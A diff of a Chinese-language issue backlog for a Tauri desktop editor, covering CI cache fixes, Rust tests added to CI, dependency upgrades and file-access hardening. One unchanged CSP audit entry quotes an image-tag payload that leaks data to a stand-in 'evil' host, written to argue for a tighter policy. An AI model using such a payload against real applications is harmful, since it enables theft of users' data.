@@ -68,6 +68,11 @@
 - **路径:** fileService（`saveFileAs` 二次写入）、wordExportService（writeFile）、wechatPreviewService（writeTextFile/save+readTextFile）、htmlPresentationService（readLocalResource）四处调用面改走受控 Rust 命令（扩展名白名单 + 黑名单复用），然后从 capabilities 删除 4 条 fs allow-*。
 - **注意:** 迁移前后须真机回归全部涉盘流程（NOT_VERIFIED 清单见 CHANGELOG ISS-197 条目）。
 
+#### ⬜ ISS-213 release.yml 的 rust-cache workdir 同款失效（ISS-212 review 顺带发现,2026-08-29）
+
+- **发现:** release.yml:40-42 的 `Swatinem/rust-cache@v2` 仍用已废弃的 `workdir` 输入,同 ci.yml MAJOR-1——缓存 key 退化为空串哈希、路径错位,release 构建每次全量冷编译拖慢发版。
+- **建议:** 改 `workspaces: src-tauri`,与 ci.yml 修复同构。
+
 #### ⬜ ISS-202 CSP 收紧评估：摘 unsafe-eval + img-src 外泄通道收敛
 
 - **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
@@ -85,9 +90,9 @@
 - **推进（2026-08-29,分支 chore/iss204-deps-upgrade）:** 升级 playwright 1.62.1、tauri api/cli、vitest 4.1.11、docx 9.7.1、mammoth 1.12.2、codemirror 系 4 项、lucide-react 1.35.0（15 个在用图标逐一验证存在）、jsdom 30.0.1（vitest peer `jsdom:*` 兼容,781 回归过）。**vditor 3.11.3 实测 breaking 回退保持 3.11.2**:Lute 多行 SVG 拆块算法变更（8 html-block → 4 html-block + 2 `<p>`）打破 `repairSplitSvgIrPreviews` 相邻兄弟前提,单测红——探针实证后回退,「3.11.3 迁移 + vendored(public/) 资源同步」单列评估。typescript 6→7 跨主版本仍单列;@types/node 26 与本地 node 22 不匹配不动。lockfile 与 package.json 同一提交（吸取 #155 review MAJOR 教训）;lockfile 包级 diff:2 删 3 增 + 46 项版本变更,全部归因 jsdom 29→30 依赖域放宽(undici 7→8 跨 major、@asamakjp/css-color 5→6 等)与 vitest 的 tinyrainbow,无未归因夹带（review MINOR-1 修正:此前表述「仅 jsdom 传递重排」低估变更面）。计数口径:13 处直接依赖变更含 playwright/test+cli 2 项截断在 diff 末尾,标题「11 项」为 vitest+playwright 合并工具链计数（review MINOR-2）。独立 review 复现全部关键声明（vditor 3.11.3 断链点定位到 vditorIrSanitizeService.ts:119 getNextAdjacentIrHtmlNode 的 nextElementSibling 相邻前提）,0 MAJOR 可合。验证:781/781、typecheck/lint/build、audit 0、npm ci dry-run EXIT=0、CI 双绿。
 - **备注（2026-08-29 更新）:** ~~`npm audit` 当前无法运行~~已恢复可运行。根因查明：全局 npm 位于 `~/.hermes/node`（npm 10.9.8 自带 @npmcli/arborist 8.0.5），其 `#loadPeerSet` 存在 `Cannot read properties of null (reading 'edgesOut')` 缺陷，`rm -rf node_modules && npm ci` 无法绕过；改用 `/opt/homebrew/bin/npm`（或 nvm node）一切正常。后续 npm install/audit 一律用 homebrew npm。
 
-#### ⬜ ISS-212 Rust cargo test 尚未纳入 CI——Rust 侧回归仅靠本地手跑（ISS-197 review 跟进发现,2026-08-29）
+#### ✅ ISS-212 Rust cargo test 纳入 CI 门槛（已 PR #157,2026-08-29 squash merge ea192ca;review 1 MAJOR〔rust-cache workdir→workspaces 缓存失效,实证 key 从空串哈希 da39a3ee 恢复为真实 lockfile 哈希 28e5d0b5〕已修,MINOR-3 --locked 同批落地;ubuntu 53/macOS 54 计数口径补准,1 个从未跑过的 cfg 测试被 CI 首次激活;release.yml 同款失效另立 ISS-213）
 
-- **发现:** CI 只跑前端(typecheck/lint/test + playwright e2e),src-tauri 的 54 个测试无 CI 门槛,lib.rs 安全校验逻辑回归不可见。
+- **发现:** CI 只跑前端(typecheck/lint/test + playwright e2e),src-tauri 的 Rust 侧测试无 CI 门槛,lib.rs 安全校验逻辑回归不可见。注:计数按平台不同——ubuntu 53 / macOS 54(源码 55 个 #[test],2 个 macOS 专属 cfg 掉;lib.rs 末段 1 个 #[cfg(not(macos))] 测试因 CI 缺失此前从未在任何机器跑过,本 PR 顺带激活)。
 - **建议:** CI 增加 cargo test job（可复用 ISS-179 Phase 4 已有的 Rust 构建缓存模式）。
 
 #### ✅ ISS-210 autosave 不落盘 pending 图片（已并入 fix/iss210-211-image-persistence 分支,2026-08-29;autosave tick 前接入 persistPendingImageAssets + blob 替换,与 handleSave 同语义;ISS-209 reloading 守卫保持前置）
